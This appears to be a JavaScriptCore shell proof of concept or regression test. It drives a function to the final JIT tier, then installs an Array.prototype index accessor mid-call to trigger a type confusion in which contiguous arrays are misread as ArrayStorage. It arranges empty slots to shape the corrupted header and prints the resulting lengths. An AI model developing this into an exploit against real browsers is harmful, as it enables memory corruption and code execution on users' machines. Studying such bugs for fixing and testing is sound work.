let trigger = false;
let stash = {};
let h = { jac: 0x4141 };

function pivot() {
    if (!trigger)
        return;
    Object.defineProperty(Array.prototype, 0, {
        get() { return 42; },
        set(_) {},
        configurable: true
    });
}
noInline(pivot);

// Leave physical contiguous slots 0 and 1 empty. Once misinterpreted as
// ArrayStorage, those two slots become a null sparse-map and zero counters.
function opt(escape) {
    let a0 = new Array(8); a0[2]=h;a0[3]=h;a0[4]=h;a0[5]=h;a0[6]=h;a0[7]=h;
    let a1 = new Array(8); a1[2]=h;a1[3]=h;a1[4]=h;a1[5]=h;a1[6]=h;a1[7]=h;
    let a2 = new Array(8); a2[2]=h;a2[3]=h;a2[4]=h;a2[5]=h;a2[6]=h;a2[7]=h;
    let a3 = new Array(8); a3[2]=h;a3[3]=h;a3[4]=h;a3[5]=h;a3[6]=h;a3[7]=h;
    let a4 = new Array(8); a4[2]=h;a4[3]=h;a4[4]=h;a4[5]=h;a4[6]=h;a4[7]=h;
    let a5 = new Array(8); a5[2]=h;a5[3]=h;a5[4]=h;a5[5]=h;a5[6]=h;a5[7]=h;
    let a6 = new Array(8); a6[2]=h;a6[3]=h;a6[4]=h;a6[5]=h;a6[6]=h;a6[7]=h;
    let a7 = new Array(8); a7[2]=h;a7[3]=h;a7[4]=h;a7[5]=h;a7[6]=h;a7[7]=h;
    pivot();
    if (escape) {
        stash.a0=a0;stash.a1=a1;stash.a2=a2;stash.a3=a3;
        stash.a4=a4;stash.a5=a5;stash.a6=a6;stash.a7=a7;
        return a0;
    }
    return isFinalTier();
}
noInline(opt);

for (let i = 0; i < 2000000; ++i) {
    if (opt(false)) {
        print("finalAt=" + i);
        break;
    }
}
trigger = true;
opt(true);
print("lengths=" + stash.a0.length + "," + stash.a1.length + "," + stash.a2.length + "," + stash.a3.length + "," + stash.a4.length + "," + stash.a5.length + "," + stash.a6.length + "," + stash.a7.length);
